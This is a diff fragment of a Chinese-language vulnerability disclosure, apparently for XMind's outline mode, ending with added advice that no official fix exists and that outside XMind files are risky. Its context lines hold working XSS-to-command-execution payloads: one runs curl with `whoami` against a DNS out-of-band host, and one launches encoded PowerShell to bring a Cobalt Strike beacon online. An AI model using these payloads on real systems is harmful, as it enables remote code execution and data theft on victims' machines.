@@ -8,3 +8,6 @@
 * DNS带外<br>``<img src=x onerror="const exec = require('child_process').exec;exec('curl `whoami`.domain.ceye.io').stdout.on('data', function (data) {alert(data);})">``<br>
 ![image](https://user-images.githubusercontent.com/53027649/124340984-d0b12580-dbeb-11eb-8e4c-990e508c66ca.png)
 * 通过对powershell进行编码，然后替换payload上线CS<br>`<img src=x onerror="const exec = require('child_process').exec;exec('powershell（……）').stdout.on('data', function (data) {alert(data);})">`
+## 处置建议
+* 目前官方暂未对该漏洞进行修复；
+* 警惕外来的XMind文件，谨慎打开大纲模式!
